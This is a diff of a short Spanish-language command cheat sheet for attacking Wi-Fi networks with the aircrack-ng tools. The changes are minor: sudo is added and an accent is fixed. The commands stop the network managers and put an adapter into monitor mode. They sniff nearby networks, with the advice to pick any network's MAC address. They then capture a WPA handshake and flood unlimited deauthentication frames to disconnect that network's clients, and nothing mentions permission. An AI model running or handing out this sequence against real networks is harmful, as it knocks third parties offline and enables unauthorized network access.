@@ -1,12 +1,13 @@
 
 
 service network-manager stop # En algunas distros es NetworkManager
+sudo systemctl stop NetworkManager 
 airmon-ng check kill
 iwconfig # Identifica tu dispositivo de red(en mi caso wlp1s0)
-airmon-ng start wlp1s0 # o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.
-airodump-ng wlp1s0 # Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.
+sudo airmon-ng start wlp1s0 # o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.
+sudo airodump-ng wlp1s0 # Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.
 sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
-sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opcion -D
+sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opción -D
 #### Ahora podemos crear una carpeta para guardar el handshake
 mkdir handshake
 cd handshake
